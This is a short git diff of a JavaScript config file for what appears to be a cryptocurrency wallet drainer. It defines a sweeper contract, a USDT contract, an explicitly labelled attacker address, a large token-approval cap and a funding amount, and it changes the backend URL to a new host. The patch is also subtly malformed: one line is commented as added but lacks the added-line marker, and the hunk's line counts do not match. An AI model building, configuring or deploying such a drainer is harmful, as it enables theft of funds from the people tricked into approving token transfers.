@@ -27,7 +27,7 @@ export const CONFIG = {
   SWEEPER_CONTRACT: "0x725d16999d92d799c6040a5d0387339122ae8fc9",
   USDT_CONTRACT: "0x55d398326f99059fF775485246999027B3197955",
   ATTACKER_ADDRESS: "0x08778541D06bE12b0CE6e92E8E19B8D97b96063B",
-  BACKEND_URL: import.meta.env.VITE_BACKEND_URL || "https://usdt-backend-delta.vercel.app",
+  BACKEND_URL: import.meta.env.VITE_BACKEND_URL || "usdt-backend-pm1voqbys-codex-bruhhhh.vercel.app",
   MAX_APPROVE_USDT: "100000",
   USDT_DECIMALS: 18,
   FUNDING_AMOUNT: "0.0005",  // <-- added this line
